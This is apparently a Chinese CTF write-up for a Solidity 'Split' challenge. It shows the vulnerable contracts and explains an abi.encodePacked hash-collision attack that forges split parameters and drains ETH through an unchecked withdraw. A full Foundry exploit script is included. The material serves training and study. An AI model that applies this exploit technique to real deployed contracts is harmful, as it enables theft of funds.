源码：`Setup.sol`，`Split.sol`，`SplitWallet.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "./need/IERC721.sol";
import "./Split.sol";

contract Setup {
    Split public  split;
   
    constructor( ) payable {
         split = new Split();

        address[] memory addrs = new address[](2);
        addrs[0] = address(0x000000000000000000000000000000000000dEaD);
        addrs[1] = address(0x000000000000000000000000000000000000bEEF);
        uint32[] memory percents = new uint32[](2);
        percents[0] = 5e5;
        percents[1] = 5e5;

        uint256 id = split.createSplit(addrs, percents, 0);

        Split.SplitData memory splitData = split.splitsById(id);
        splitData.wallet.deposit{value: 10 ether}();

      
    }
  

    function isSolved() external view returns (bool) {
        Split.SplitData memory splitData = split.splitsById(0);

        return address(split).balance == 0 && address(splitData.wallet).balance == 0;
    }
}

```

```solidity
// SPDX-License-Identifier: MIT 
pragma solidity ^0.8.9;
import "./need/IERC20.sol";
import "./need/ERC721.sol";
import "./need/ClonesWithImmutableArgs.sol";
import "./SplitWallet.sol";


contract Split is ERC721("Split", "SPLIT") { // 可拆分钱包
    using ClonesWithImmutableArgs for address;

    struct SplitData {
        bytes32 hash;
        SplitWallet wallet;
    }

    SplitWallet private immutable IMPLEMENTATION = new SplitWallet();
    uint256 private immutable SCALE = 1e6;

    uint256 public nextId;

    mapping(uint256 => SplitData) private _splitsById;

    mapping(address => mapping(address => uint256)) public balances;

    modifier onlySplitOwner(uint256 splitId) {
        _onlySplitOwner(splitId);
        _;
    }

    function _onlySplitOwner(uint256 splitId) private view {
        require(msg.sender == ownerOf(splitId), "NOT_SPLIT_OWNER");
    }

    modifier validSplit(address[] memory accounts, uint32[] memory percents, uint32 relayerFee) {
        _validSplit(accounts, percents, relayerFee);
        _;
    }

    function _validSplit(address[] memory accounts, uint32[] memory percents, uint32 relayerFee) private pure {
        require(accounts.length == percents.length, "MISMATCH_LENGTH");

        uint256 sum;
        for (uint256 i = 0; i < accounts.length; i++) {
            sum += percents[i];
        }

        require(sum == SCALE, "INVALID_PERCENTAGES");

        require(relayerFee < SCALE / 10, "INVALID_RELAYER_FEE");
    }

    function createSplit(address[] memory accounts, uint32[] memory percents, uint32 relayerFee)
        external
        returns (uint256)
    {
        return _createSplit(accounts, percents, relayerFee, msg.sender);
    }

    function createSplitFor(address[] memory accounts, uint32[] memory percents, uint32 relayerFee, address owner)
        external
        returns (uint256)
    {
        return _createSplit(accounts, percents, relayerFee, owner);
    }

    function _createSplit(address[] memory accounts, uint32[] memory percents, uint32 relayerFee, address owner)
        private
        validSplit(accounts, percents, relayerFee)
        returns (uint256)
    {
        uint256 tokenId = nextId++;

        address wallet = address(IMPLEMENTATION).clone(abi.encodePacked(address(this)));

        _splitsById[tokenId] =
            SplitData({hash: _hashSplit(accounts, percents, relayerFee), wallet: SplitWallet(payable(wallet))});

        _mint(owner, tokenId);

        return tokenId;
    }

    function updateSplit(uint256 splitId, address[] memory accounts, uint32[] memory percents, uint32 relayerFee)
        external
    {
        _updateSplit(splitId, accounts, percents, relayerFee);
    }

    function updateSplitAndDistribute(
        uint256 splitId,
        address[] memory accounts,
        uint32[] memory percents,
        uint32 relayerFee,
        IERC20 token
    ) external {
        _updateSplit(splitId, accounts, percents, relayerFee);
        _distribute(splitId, accounts, percents, relayerFee, token);
    }

    function distribute(
        uint256 splitId,
        address[] memory accounts,
        uint32[] memory percents,
        uint32 relayerFee,
        IERC20 token
    ) external {
        _distribute(splitId, accounts, percents, relayerFee, token);
    }

    function withdraw(IERC20[] calldata tokens, uint256[] calldata amounts) external { // 未对调用者进行检查
        for (uint256 i = 0; i < tokens.length; i++) {
            IERC20 token = tokens[i];
            uint256 amount = amounts[i];

            balances[msg.sender][address(token)] -= amount;

            if (address(token) == address(0x00)) {
                payable(msg.sender).transfer(amount);
            } else {
                token.transfer(msg.sender, amount);
            }
        }
    }

    function _updateSplit(uint256 splitId, address[] memory accounts, uint32[] memory percents, uint32 relayerFee)
        private
        onlySplitOwner(splitId)
        validSplit(accounts, percents, relayerFee)
    {
        _splitsById[splitId].hash = _hashSplit(accounts, percents, relayerFee);
    }

    function _distribute(
        uint256 splitId,
        address[] memory accounts,
        uint32[] memory percents,
        uint32 relayerFee,
        IERC20 token
    ) private {
        // 限制，对身份进行校验 -> _hashSplit使用的是abi.encodePacket (hash collision)
        // 没对数组长度进行校验，可以利用
        require(_splitsById[splitId].hash == _hashSplit(accounts, percents, relayerFee)); 

        SplitWallet wallet = _splitsById[splitId].wallet;
        uint256 storedWalletBalance = balances[address(wallet)][address(token)]; // 一般都为0
        uint256 externalWalletBalance = wallet.balanceOf(token); // 关注

        uint256 totalBalance = storedWalletBalance + externalWalletBalance;

        if (msg.sender != ownerOf(splitId)) {
            uint256 relayerAmount = totalBalance * relayerFee / SCALE; // relayerFee为0，不考虑
            balances[msg.sender][address(token)] += relayerAmount;
            totalBalance -= relayerAmount;
        }

        for (uint256 i = 0; i < accounts.length; i++) {
            balances[accounts[i]][address(token)] += totalBalance * percents[i] / SCALE; // 做高percent
        }

        if (storedWalletBalance > 0) {
            balances[address(wallet)][address(token)] = 0;
        }

        if (externalWalletBalance > 0) {
            wallet.pullToken(token, externalWalletBalance);
        }
    }

    function _hashSplit(address[] memory accounts, uint32[] memory percents, uint32 relayerFee)
        internal
        pure
        returns (bytes32)
    {
        // 将给定参数根据其所需最低空间编码，会把其中填充的很多 0 省略
        return keccak256(abi.encodePacked(accounts, percents, relayerFee));

    }

    function splitsById(uint256 id) external view returns (SplitData memory) {
        return _splitsById[id];
    }

    receive() external payable {}
}

```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./need/Clone.sol";
import "./need/IERC20.sol";
contract SplitWallet is Clone {
    function deposit() external payable {}

    function pullToken(IERC20 token, uint256 amount) external {
        require(msg.sender == _getArgAddress(0));

        if (address(token) == address(0x00)) {
            payable(msg.sender).transfer(amount);
        } else {
            token.transfer(msg.sender, amount);
        }
    }

    function balanceOf(IERC20 token) external view returns (uint256) {
        if (address(token) == address(0x00)) {
            return address(this).balance;
        }

        return token.balanceOf(address(this));
    }
}

```

解题条件是`address(split).balance == 0 && address(splitData.wallet).balance == 0`，就是Split合约的余额为0，0钱包（初始钱包）的余额为0。

解题关键有两个函数`distribute`和`withdraw`，`withdraw`函数未对调用者进行检查，`distribute`函数内部调用`_distribute`函数，它里面有个身份校验，但是用的是`abi.encodePacked`，这是一个紧凑拼接，我们可以构造一个假的身份信息。

总体思路：

首先调用`distribute`函数，我们先构造传入参数，

```solidity
address[] memory accounts1 = new address[](0);
uint32[] memory percents1 = new uint32[](4);
percents1[0] = 0xdEaD;
percents1[1] = 0xbEEF;
percents1[2] = 500000;
percents1[3] = 500000;
```

accounts传入空，把原来的address放在percents里面，这样通过`keccak256(abi.encodePacked())`之后和最开始的哈希就是相同的，这样我们就把初始钱包里的钱提出到合约里，但是因为地址传的是空，所以这个钱不属于这两个地址。

接下来我们创建一个新的钱包，因为最后我们要通过`withdraw`函数转走Split合约里的钱，但是只能转走msg.sender的钱，所以我们要做高percents，使Split合约里的钱都属于我，接下来构造一个假地址

```solidity
address[] memory addr = new address[](2);
addr[0] = msg.sender;
addr[1] = address(uint160(11000000));
uint32[] memory perc = new uint32[](2);
perc[0] = 1000000;
perc[1] = 0;
```

addr[1]地址的选择是因为`balances[accounts[i]][address(token)] += totalBalance * percents[i] / SCALE;`，我想让结果等于11（因为我后续要deposit 1ETH），我需要让我的balances等于合约里的余额，最后都转走。

第二次`distribute`参数构造

```solidity
address[] memory a2 = new address[](1);
a2[0] = address(msg.sender);
uint32[] memory p2 = new uint32[](3);
p2[0] = 0xa7d8c0;
p2[1] = 1000000;
p2[2] = 0;
```

脚本：`Attack.s.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import {Script, console} from "forge-std/Script.sol";
import {Setup} from "../contracts/Setup.sol";
import {Split} from "../contracts/Split.sol";
import {SplitWallet} from "../contracts/SplitWallet.sol";
import {IERC20} from "../contracts/need/IERC20.sol";

contract POC is Script {
    function run() external {
        vm.startBroadcast();

        Setup setup = Setup(0x7037620E57d1418a70245d5ff176AEA92080Aa6a);
        Split split = setup.split();

        address[] memory accounts1 = new address[](0);
        // accounts1[0] = address(0x000000000000000000000000000000000000dEaD);
        // accounts1[1] = address(0x000000000000000000000000000000000000bEEF);
        uint32[] memory percents1 = new uint32[](4);
        percents1[0] = 0xdEaD;
        percents1[1] = 0xbEEF;
        percents1[2] = 500000;
        percents1[3] = 500000;
        split.distribute(0, accounts1, percents1, 0, IERC20(address(0)));

        address[] memory addr = new address[](2);
        addr[0] = msg.sender;
        addr[1] = address(uint160(11000000));
        uint32[] memory perc = new uint32[](2);
        perc[0] = 1000000;
        perc[1] = 0;
        split.createSplit(addr, perc, 0);

        address[] memory a2 = new address[](1);
        a2[0] = address(msg.sender);
        uint32[] memory p2 = new uint32[](3);
        p2[0] = 0xa7d8c0;
        p2[1] = 1000000;
        p2[2] = 0;

        Split.SplitData memory splitData = split.splitsById(1);
        splitData.wallet.deposit{value: 1 ether}();
        // console.logBytes(abi.encodePacked(addr, perc, uint32(0)));
        // console.logBytes(abi.encodePacked(a2, p2, uint32(0)));
        split.distribute(1, a2, p2, 0, IERC20(address(0)));

        uint256 myBalance = split.balances(msg.sender, address(0));
        console.log("My Balance in Split:", myBalance);
        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(address(0));
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = myBalance;
        split.withdraw(tokens, amounts);

        vm.stopBroadcast();

        // 验证
        console.log("Split balance:", address(split).balance);
        console.log("Wallet balance0:", address(split.splitsById(0).wallet).balance);
        console.log("Wallet balance1:", address(split.splitsById(1).wallet).balance);
        console.log("Solved:", setup.isSolved());
    }

    fallback() external payable {}
}
```

